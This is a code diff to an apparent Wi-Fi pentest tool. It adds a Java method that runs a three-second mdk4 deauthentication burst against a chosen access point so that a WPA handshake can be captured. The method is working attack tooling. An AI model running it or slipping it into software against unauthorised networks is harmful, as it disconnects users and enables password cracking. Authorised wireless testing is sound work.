@@ -109,6 +109,32 @@ public final class WifiDeauthEngine {
         return log.toString();
     }
 
+    /**
+     * Short mdk4 deauth burst for handshake capture (mode d, ~3s then kill).
+     * Prefer over aireplay when the user selects mdk4 as HS deauth method.
+     */
+    public static String fireMdk4Burst(Core core, String iface, String bssid, int channel,
+                                       @Nullable LineSink sink) {
+        if (core == null || iface == null || bssid == null) {
+            return "mdk4 deauth skipped";
+        }
+        String b = bssid.trim();
+        // Run mdk4 for a few seconds then stop so clients can reconnect (wifite-style).
+        StringBuilder cmd = new StringBuilder("mdk4 ").append(iface).append(" d -B ").append(b);
+        if (channel > 0) {
+            // Pin to AP channel via iface lock beforehand; -c here would hop.
+            // Keep pps moderate for a clean burst.
+        }
+        cmd.append(" -s 80");
+        String full = "( " + cmd + " & pid=$!; sleep 3; kill $pid 2>/dev/null; wait $pid 2>/dev/null; true ) 2>&1";
+        logLine(sink, "[deauth-mdk4] " + cmd + " (3s burst)");
+        ArrayList<String> out = core.customChrootCommand(full);
+        for (String line : out) {
+            if (line != null && !line.trim().isEmpty()) logLine(sink, "  " + line);
+        }
+        return "mdk4 d -B " + b + " ×3s";
+    }
+
     /** Convenience overload without a log sink. */
     public static String fireBurst(Core core, String iface, String bssid,
                                    @Nullable Iterable<String> clients) {
